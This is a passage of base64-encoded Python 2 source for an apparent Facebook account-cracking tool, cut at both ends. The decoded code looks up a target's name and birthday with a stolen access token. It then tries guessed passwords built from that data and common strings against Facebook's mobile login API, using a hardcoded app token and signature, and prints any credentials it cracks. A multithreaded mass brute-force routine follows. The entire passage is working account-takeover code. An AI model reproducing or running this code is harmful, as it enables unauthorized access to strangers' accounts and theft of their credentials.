gIGxvZ2luKCkKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICBwcmludCBsb2dvCiAgcHJpbnQgIlwwMzNbMTs5N21bXDAzM1sxOzkxbUlORk9cMDMzWzE7OTdtXSBcMDMzWzE7OTFtVGhlIHRhcmdldCBhY2NvdW50IG11c3QgYmUgZnJpZW5kc1xuICAgICAgIHdpdGggeW91ciBhY2NvdW50IGZpcnN0ISIKICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICB0cnk6CiAgICBpZCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVGFyZ2V0IElEIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiKQogICAgamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtV2FpdCBhIG1pbnV0ZSBcMDMzWzE7OTdtLi4uJykKICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWQrIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkKICAgIGEgPSBqc29uLmxvYWRzKHIudGV4dCkKICAgIHByaW50ICdcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtIDogJythWyduYW1lJ10KICAgIGphbGFuKCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1DaGVjayBcMDMzWzE7OTdtLi4uJykKICAgIHRpbWUuc2xlZXAoMikKICAgIGphbGFuKCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1PcGVuIHBhc3N3b3JkIFwwMzNbMTs5N20uLi4nKQogICAgdGltZS5zbGVlcCgyKQogICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICBwejEgPSBhWydmaXJzdF9uYW1lJ10rJzEyMycKICAgIGRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGlkKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwejEpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQogICAgeSA9IGpzb24ubG9hZChkYXRhKQogICAgaWYgJ2FjY2Vzc190b2tlbicgaW4geToKICAgICAgcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgogICAgICBwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCiAgICAgIHByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKICAgICAgcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejEKICAgICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgICAgbWVudV9oYWNrKCkKICAgIGVsc2U6CiAgICAgIGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB5WyJlcnJvcl9tc2ciXToKICAgICAgICBwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCiAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIKICAgICAgICBwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCiAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAogICAgICAgIHByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHoxCiAgICAgICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgICAgICBtZW51X2hhY2soKQogICAgICBlbHNlOgogICAgICAgIHB6MiA9IGFbJ2ZpcnN0X25hbWUnXSArICcxMjM0NScKICAgICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhpZCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHoyKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKICAgICAgICB5ID0ganNvbi5sb2FkKGRhdGEpCiAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4geToKICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHoyCiAgICAgICAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgICAgICAgbWVudV9oYWNrKCkKICAgICAgICBlbHNlOgogICAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbImVycm9yX21zZyJdOgogICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCiAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiCiAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAogICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6MgogICAgICAgICAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgICAgICAgICBtZW51X2hhY2soKQogICAgICAgICAgZWxzZToKICAgICAgICAgICAgcHozID0gYVsnbGFzdF9uYW1lJ10gKyAnMTIzJwogICAgICAgICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhpZCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHozKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKICAgICAgICAgICAgeSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiB5OgogICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCiAgICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAogICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHozCiAgICAgICAgICAgICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgICAgICAgICAgICBtZW51X2hhY2soKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgIGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB5WyJlcnJvcl9tc2ciXToKICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiCiAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCiAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCiAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6MwogICAgICAgICAgICAgICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgICAgICAgICAgICAgIG1lbnVfaGFjaygpCiAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGxhaGlyID0gYVsnYmlydGhkYXknXQogICAgICAgICAgICAgICAgcHo0ID0gbGFoaXIucmVwbGFjZSgnLycsICcnKQogICAgICAgICAgICAgICAgZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisoaWQpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHB6NCkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCiAgICAgICAgICAgICAgICB5ID0ganNvbi5sb2FkKGRhdGEpCiAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiB5OgogICAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCiAgICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KICAgICAgICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAogICAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NAogICAgICAgICAgICAgICAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgICAgICAgICAgICAgICBtZW51X2hhY2soKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbImVycm9yX21zZyJdOgogICAgICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKICAgICAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTNtQWNjb3VudCBDaGVja3BvaW50IgogICAgICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejQKICAgICAgICAgICAgICAgICAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgICAgICAgICAgICAgICAgIG1lbnVfaGFjaygpCiAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgbGFoaXJzID0gYVsnYmlydGhkYXknXQogICAgICAgICAgICAgICAgICAgIGdheiA9IGxhaGlycy5yZXBsYWNlKCcvJywgJycpCiAgICAgICAgICAgICAgICAgICAgcHo1ID0gYVsnZmlyc3RfbmFtZSddK2dhegogICAgICAgICAgICAgICAgICAgIGRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGlkKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwejUpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQogICAgICAgICAgICAgICAgICAgIHkgPSBqc29uLmxvYWQoZGF0YSkKICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiB5OgogICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgogICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAogICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejUKICAgICAgICAgICAgICAgICAgICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICAgICAgICAgICAgICAgICAgICBtZW51X2hhY2soKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHo1CiAgICAgICAgICAgICAgICAgICAgICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICAgICAgICAgICAgICAgICAgICAgIG1lbnVfaGFjaygpCiAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBwejYgPSAia29udG9sMTIzIgogICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhpZCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHo2KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKICAgICAgICAgICAgICAgICAgICAgICAgeSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiB5OgogICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCiAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAogICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHo2CiAgICAgICAgICAgICAgICAgICAgICAgICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgICAgICAgICAgICAgICAgICAgICAgICBtZW51X2hhY2soKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgIGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB5WyJlcnJvcl9tc2ciXToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lbnVfaGFjaygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB6NyA9ICJzYXlhbmcxMjMiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhpZCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHo3KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHkgPSBqc29uLmxvYWQoZGF0YSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHo3CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lbnVfaGFjaygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVudV9oYWNrKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVshXSBTb3JyeSwgZmFpbGVkIHRvIG9wZW4gdGhlIHRhcmdldCBwYXNzd29yZCA6KCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVshXSB0cnkgaXQgYW5vdGhlciB3YXkuIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVudV9oYWNrKCkKICBleGNlcHQgS2V5RXJyb3I6CiAgICBwcmludCAiXDAzM1sxOzkxbVshXSBUZXJnZXQgbm90IGZvdW5kIgogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIG1lbnVfaGFjaygpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKIyMjIyMgTXVsdGkgQnJ1dGUgRm9yY2UgIyMjIyMKIyMjIyMgQ1JBQ0sgIyMjIwpkZWYgY3JhY2soKToKICBnbG9iYWwgaWRsaXN0LHBhc3N3LGZpbGUKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICB0cnk6CiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgcHJpbnQgbG9nbwogIGlkbGlzdCA9IHJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBJRCAgXDAzM1sxOzkxbTogXDAzM1sxOzk3bScpCiAgcGFzc3cgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybVBhc3N3b3JkIFwwMzNbMTs5MW06IFwwMzNbMTs5N20nKQogIHRyeToKICAgIGZpbGUgPSBvcGVuKChpZGxpc3QpLCAiciIpCiAgICBqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykKICAgIGZvciB4IGluIHJhbmdlKDQwKToKICAgICAgemVkZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNjcmFrLCBhcmdzPSgpKQogICAgICB6ZWRkLnN0YXJ0KCkKICAgICAgdGhyZWFkcy5hcHBlbmQoemVkZCkKICAgIGZvciB6ZWRkIGluIHRocmVhZHM6CiAgICAgIHplZGQuam9pbigpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCAoIlwwMzNbMTs5MW1bIV0gRmlsZSBub3QgZm91bmQiKQogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIG1lbnVfaGFjaygpCiAgICAKZGVmIHNjcmFrKCk6CiAgZ2xvYmFsIGJlcmhhc2lsLGNla3BvaW50LGdhZ2FsLGJhY2ssdXAKICB0cnk6CiAgICBvcy5ta2Rpcignb3V0JykKICBleGNlcHQgT1NFcnJvcjoKICAgIHBhc3MKICB0cnk6CiAgICBidWthID0gb3BlbihpZGxpc3Qs